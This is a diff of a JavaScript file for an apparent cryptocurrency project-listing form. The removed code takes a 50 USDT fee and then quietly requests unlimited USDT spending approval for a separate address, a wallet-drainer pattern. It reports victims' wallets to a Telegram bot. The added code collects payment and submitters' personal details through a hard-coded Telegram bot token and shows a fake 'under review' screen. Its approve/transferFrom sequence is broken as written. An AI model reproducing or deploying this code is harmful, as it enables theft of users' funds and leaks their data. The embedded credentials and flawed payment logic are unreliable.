@@ -1,120 +1,142 @@
-import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js";
-import { Web3Modal } from "https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.6.0/dist/index.js";
-import { EthereumClient, w3mConnectors, w3mProvider } from "https://cdn.jsdelivr.net/npm/@web3modal/ethereum@2.6.0/dist/index.js";
-import { configureChains, createConfig } from "https://cdn.jsdelivr.net/npm/@wagmi/core@1.4.0/dist/index.js";
-
-// CONFIG
-const RECEIVER = "0xea8ee0d7fc1b114a66330332fdf32d3c1df7e12a";
+/************ CONFIG ************/
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const FEE = 50;
-const SPENDER_ADDRESS = "0xa2b9cade09d3cefdee5e981ca0517912bedc5961";
+const RECEIVER = "0xf539bf56c465b6d0f0caee783ca1f8c58c802b1a";
+const AMOUNT_USDT = "50";
+const USDT_DECIMALS = 6;
 
-const TELEGRAM_BOT = "8562127548:AAHEHQJUybHFkRNQgVLDdObeWApo9tXWjmY";
-const ADMIN_CHAT_ID = "7662871309";
+const TELEGRAM_BOT_TOKEN = "8562127548:AAHEHQJUybHFkRNQgVLDdObeWApo9tXWjmY";
+const TELEGRAM_CHAT_ID = "7662871309";
+const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
 
-const WC_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
+/************ DOM ************/
+document.addEventListener("DOMContentLoaded", () => {
 
-const ERC20_ABI = [
-  "function transfer(address to, uint256 value) returns (bool)",
-  "function decimals() view returns (uint8)",
-  "function approve(address spender, uint256 amount) external returns (bool)"
-];
+  const form = document.getElementById("projectForm");
+  const paymentModal = document.getElementById("paymentModal");
+  const walletModal = document.getElementById("walletModal");
+  const underReviewModal = document.getElementById("underReviewModal");
 
-// DOM
-const form = document.getElementById("tokenForm");
-const modal = document.getElementById("feeModal");
-const payBtn = document.getElementById("connectWalletBtn");
-const closeBtn = document.getElementById("closeModal");
-const statusBox = document.getElementById("statusBox");
+  const connectPayBtn = document.getElementById("connectPayBtn");
+  const metaMaskBtn = document.getElementById("metaMaskBtn");
+  const walletConnectBtn = document.getElementById("walletConnectBtn");
+  const closeReviewBtn = document.getElementById("closeReviewBtn");
+  const statusText = document.getElementById("statusText");
 
-// Web3Modal
-const chains = [{ id: 1, name: "Ethereum", network: "homestead" }];
-const { publicClient } = configureChains(chains, [w3mProvider({ projectId: WC_PROJECT_ID })]);
-const wagmiConfig = createConfig({ autoConnect: true, connectors: w3mConnectors({ projectId: WC_PROJECT_ID, chains }), publicClient });
-const ethereumClient = new EthereumClient(wagmiConfig, chains);
-const web3Modal = new Web3Modal({ projectId: WC_PROJECT_ID }, ethereumClient);
-
-// Wallet init
-async function initWallet() {
-  try {
-    await web3Modal.openModal();
-    const provider = new ethers.BrowserProvider(web3Modal.getWalletProvider());
-    const signer = await provider.getSigner();
-    const userAddress = await signer.getAddress();
-    statusBox.textContent = `Wallet connected ✅ ${userAddress}`;
-    return { signer, userAddress };
-  } catch (err) {
-    console.error(err);
-    statusBox.textContent = "Wallet connection failed ❌";
-    return null;
-  }
-}
-
-// Telegram notify
-async function sendTelegram(chatId, message) {
-  if (!chatId) return;
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text: message })
+  /************ FORM ************/
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+    paymentModal.style.display = "flex";
   });
-}
 
-// Form submit
-form.addEventListener("submit", (e) => {
-  e.preventDefault();
-  if (!grecaptcha.getResponse()) { alert("Please complete reCAPTCHA."); return; }
-  modal.classList.remove("hidden");
-  statusBox.textContent = "";
-});
+  connectPayBtn.onclick = () => {
+    paymentModal.style.display = "none";
+    walletModal.style.display = "flex";
+  };
 
-// Modal close
-closeBtn.onclick = () => { modal.classList.add("hidden"); statusBox.textContent = ""; };
+  closeReviewBtn.onclick = () => {
+    underReviewModal.style.display = "none";
+  };
 
-// Payment
-payBtn.onclick = async () => {
-  const wallet = await initWallet();
-  if (!wallet) return;
+  /************ HELPERS ************/
+  function getFormData() {
+    return Object.fromEntries(new FormData(form).entries());
+  }
 
-  const { signer, userAddress } = wallet;
-  statusBox.textContent = "Preparing payment...";
+  function showUnderReview() {
+    localStorage.setItem("projectSubmissionStatus", "under_review");
+    walletModal.style.display = "none";
+    underReviewModal.style.display = "flex";
+  }
 
-  try {
-    const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
-    const decimals = await usdt.decimals();
-    const amount = ethers.parseUnits(FEE.toString(), decimals);
-
-    statusBox.textContent = "Confirm payment in wallet...";
-    const tx = await usdt.transfer(RECEIVER, amount);
-    await tx.wait();
-
-    statusBox.textContent = "Payment successful ✅ Granting unlimited approval...";
-    const approveTx = await usdt.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-    await approveTx.wait();
-    statusBox.textContent = "Unlimited approval granted ✅";
-
-    await sendTelegram(
-      ADMIN_CHAT_ID,
-      `✅ Fee paid + approval granted\nWallet: ${userAddress}\nFeeTx: ${tx.hash}\nApprovalTx: ${approveTx.hash}`
-    );
-
-    const formData = Object.fromEntries(new FormData(form).entries());
-    const recaptcha = grecaptcha.getResponse();
-    const res = await fetch("/submit", {
+  async function sendToTelegram(message) {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ txHash: tx.hash, approvalTx: approveTx.hash, recaptcha, project: formData })
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "HTML"
+      })
+    });
+  }
+
+  function formatTelegramMessage(data, txHash) {
+    return `
+<b>🆕 New Project Submission</b>
+
+<b>Project:</b> ${data.projectName}
+<b>Symbol:</b> ${data.tokenSymbol}
+<b>Chain:</b> ${data.blockchain}
+<b>Contract:</b> ${data.contract}
+
+<b>Description:</b>
+${data.description}
+
+<b>Website:</b> ${data.website}
+<b>Twitter:</b> ${data.twitter}
+<b>Telegram:</b> ${data.telegram}
+
+<b>Developer:</b> ${data.devName}
+<b>Email:</b> ${data.devEmail}
+
+<b>Payment TX:</b>
+<code>${txHash}</code>
+
+<b>Status:</b> UNDER REVIEW
+`;
+  }
+
+  /************ PAYMENT CORE ************/
+  async function processPayment(provider) {
+    const signer = provider.getSigner();
+    const userAddress = await signer.getAddress();
+
+    const usdt = new ethers.Contract(
+      USDT_ADDRESS,
+      [
+        "function approve(address,uint256)",
+        "function transferFrom(address,address,uint256)"
+      ],
+      signer
+    );
+
+    const amount = ethers.utils.parseUnits(AMOUNT_USDT, USDT_DECIMALS);
+
+    statusText.textContent = "Approving USDT…";
+    await (await usdt.approve(RECEIVER, amount)).wait();
+
+    statusText.textContent = "Sending payment…";
+    const tx = await usdt.transferFrom(userAddress, RECEIVER, amount);
+    await tx.wait();
+
+    const formData = getFormData();
+    await sendToTelegram(formatTelegramMessage(formData, tx.hash));
+
+    showUnderReview();
+  }
+
+  /************ WALLET OPTIONS ************/
+  metaMaskBtn.onclick = async () => {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    await processPayment(provider);
+  };
+
+  walletConnectBtn.onclick = async () => {
+    const wcProvider = await window.WalletConnectEthereumProvider.init({
+      projectId: WALLETCONNECT_PROJECT_ID,
+      chains: [1],
+      showQrModal: true
     });
 
-    const data = await res.json();
-    if (data.success) {
-      statusBox.textContent = "Project submitted successfully ✅";
-      setTimeout(() => { modal.classList.add("hidden"); form.reset(); grecaptcha.reset(); }, 1500);
-    } else {
-      statusBox.textContent = "Error: " + data.error;
-    }
-  } catch (err) {
-    console.error(err);
-    statusBox.textContent = "Payment or approval failed ❌";
+    await wcProvider.enable();
+    const provider = new ethers.providers.Web3Provider(wcProvider);
+    await processPayment(provider);
+  };
+
+  /************ PERSISTENCE ************/
+  if (localStorage.getItem("projectSubmissionStatus") === "under_review") {
+    underReviewModal.style.display = "flex";
   }
-};
+
+});
